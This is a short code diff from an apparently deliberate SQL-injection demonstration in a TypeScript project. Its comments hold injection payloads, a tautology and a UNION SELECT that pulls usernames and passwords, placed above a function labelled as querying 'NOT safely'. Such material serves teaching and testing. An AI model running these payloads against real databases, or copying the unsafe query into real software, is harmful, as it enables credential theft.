@@ -41,7 +41,7 @@ export async function getUserData() {
   return results;
 }
 //' or ''='
-//Netherlands' UNION SELECT u.username,u.password, r.league, r.group, r.id, r.goaldiff FROM users u, results r --
+//Netherlands' UNION SELECT  r.id, u.username,u.password, r.league, r.group, r.goaldiff FROM users u, results r --
 export async function getResultsNotSafe(team: any) {
   console.log("Trying to get results NOT safely");
   const query = await pool.query(
